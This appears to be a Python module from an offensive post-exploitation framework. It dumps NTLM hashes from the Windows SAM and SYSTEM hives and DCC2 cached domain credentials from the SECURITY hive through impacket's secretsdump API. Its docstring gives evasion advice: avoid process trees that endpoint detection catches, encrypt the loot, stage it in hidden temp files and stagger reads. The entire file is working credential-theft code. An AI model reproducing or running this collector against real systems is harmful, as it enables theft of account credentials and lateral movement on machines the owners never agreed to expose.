"""
forge/utils/post/collectors/win_creds.py
WinCredCollector — Module 5-H.

Extracts Windows credential material via impacket secretsdump (local mode).
Targets: SAM hive, SYSTEM hive, cached domain credentials (SECURITY hive).

Requires: impacket >= 0.12.0 (pinned dependency).
Platform: Windows only (degrades gracefully on Linux/macOS).

OPSEC:
  - Uses impacket Python API (no subprocess invocation of secretsdump binary).
    Subprocess invocation creates a new process tree detectable by EDR.
  - Hive access requires SYSTEM or Administrator privileges.
  - Output compressed + AES-256-GCM encrypted before staging.
  - Credential hashes NEVER written plaintext to disk or DB.
  - Metadata only (path, sha256, size_bytes) persisted to engagement DB.
  - Stagger enforced between hive reads.
"""
from __future__ import annotations

import json
import logging
import os
import sys
import tempfile
from pathlib import Path
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile
from forge.utils.ssl_hygiene import restore_default_ssl_context

_LOG = logging.getLogger(__name__)

_IS_WINDOWS = sys.platform == "win32"

# Hive paths (standard Windows locations)
_HIVE_PATHS = {
    "SAM":      Path("C:/Windows/System32/config/SAM"),
    "SYSTEM":   Path("C:/Windows/System32/config/SYSTEM"),
    "SECURITY": Path("C:/Windows/System32/config/SECURITY"),
}


class WinCredCollector(BaseCollector):
    """
    Windows credential material collector using impacket secretsdump local API.

    Extracts NTLM hashes from SAM + SYSTEM hives. Optionally extracts cached
    domain credentials from SECURITY hive (requires SYSTEM privilege).

    Args:
        include_cached_creds: Include DCC2 cached domain credential hashes (requires SYSTEM).
    """

    def __init__(self, *args, include_cached_creds: bool = False, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self._include_cached = include_cached_creds

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        if not _IS_WINDOWS:
            return

        # 1. SAM/SYSTEM
        sam_path = _HIVE_PATHS["SAM"]
        sys_path = _HIVE_PATHS["SYSTEM"]
        if sam_path.exists() and sys_path.exists():
            yield ArtifactMetadata(
                artifact_family="windows_credentials",
                artifact_subtype="sam_dump",
                source_path="SAM_SYSTEM_HIVES",
                source_platform=os.name,
                collection_method="api_call",
            )

        # 2. SECURITY (cached creds)
        sec_path = _HIVE_PATHS["SECURITY"]
        if sec_path.exists() and self._include_cached:
            yield ArtifactMetadata(
                artifact_family="windows_credentials",
                artifact_subtype="cached_creds",
                source_path="SECURITY_HIVE",
                source_platform=os.name,
                collection_method="api_call",
            )

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        if not _IS_WINDOWS:
            return None

        if artifact.artifact_subtype == "sam_dump":
            return self._dump_sam(artifact)
        elif artifact.artifact_subtype == "cached_creds":
            return self._dump_cached(artifact)
        return None

    def _dump_sam(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        """Extract NTLM hashes from SAM + SYSTEM hives via impacket local SAM dump."""
        try:
            try:
                from impacket.examples.secretsdump import LocalOperations, SAMHashes
            finally:
                restore_default_ssl_context()

            sam_path = _HIVE_PATHS["SAM"]
            sys_path = _HIVE_PATHS["SYSTEM"]

            local_ops = LocalOperations(str(sys_path))
            boot_key  = local_ops.getBootKey()
            sam_hashes = SAMHashes(str(sam_path), boot_key, isRemote=False)

            # Capture output — impacket prints to stdout; redirect via callback
            import io, logging as _logging
            capture = io.StringIO()
            handler = _logging.StreamHandler(capture)
            root_log = _logging.getLogger("impacket")
            root_log.addHandler(handler)
            sam_hashes.dump()
            root_log.removeHandler(handler)
            results = capture.getvalue().strip().splitlines()

            sam_hashes.finish()

            if not results:
                return None

            bundle  = json.dumps({"source": "SAM", "hashes": results}).encode()
            sha256  = self._sha256(bundle)
            payload = self._compress_and_encrypt(bundle)
            del bundle
            del results

            stage_path = self._staging_dir / f".{sha256[:16]}.sam.tmp"
            stage_path.write_bytes(payload)
            self._register_cleanup(stage_path)

            record = CollectedFile(
                path="SAM_DUMP",
                sha256=sha256,
                size_bytes=len(payload),
                metadata=artifact
            )
            self.persist_metadata(record)
            self._stagger_and_pause()
            return record

        except ImportError:
            _LOG.warning("impacket not available — WinCredCollector disabled.")
        except PermissionError:
            _LOG.debug("Insufficient privileges to read SAM/SYSTEM hives.")
        except Exception as exc:
            _LOG.debug("SAM dump error: %s", exc)

    def _dump_cached(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        """Extract DCC2 cached domain credential hashes from SECURITY hive."""
        try:
            try:
                from impacket.examples.secretsdump import LocalOperations, CachedDumpSecrets
            finally:
                restore_default_ssl_context()

            sec_path = _HIVE_PATHS["SECURITY"]
            sys_path = _HIVE_PATHS["SYSTEM"]

            local_ops = LocalOperations(str(sys_path))
            boot_key  = local_ops.getBootKey()

            import io, logging as _logging
            capture = io.StringIO()
            handler = _logging.StreamHandler(capture)
            root_log = _logging.getLogger("impacket")
            root_log.addHandler(handler)

            cached = CachedDumpSecrets(str(sec_path), boot_key, isRemote=False)
            cached.dump()
            root_log.removeHandler(handler)
            results = capture.getvalue().strip().splitlines()
            cached.finish()

            if not results:
                return None

            bundle  = json.dumps({"source": "CACHED_DCC2", "hashes": results}).encode()
            sha256  = self._sha256(bundle)
            payload = self._compress_and_encrypt(bundle)
            del bundle
            del results

            stage_path = self._staging_dir / f".{sha256[:16]}.dcc2.tmp"
            stage_path.write_bytes(payload)
            self._register_cleanup(stage_path)

            record = CollectedFile(
                path="CACHED_DCC2_DUMP",
                sha256=sha256,
                size_bytes=len(payload),
                metadata=artifact
            )
            self.persist_metadata(record)
            self._stagger_and_pause()
            return record

        except ImportError:
            pass
        except PermissionError:
            _LOG.debug("Insufficient privileges for SECURITY hive — need SYSTEM.")
        except Exception as exc:
            _LOG.debug("Cached creds dump error: %s", exc)
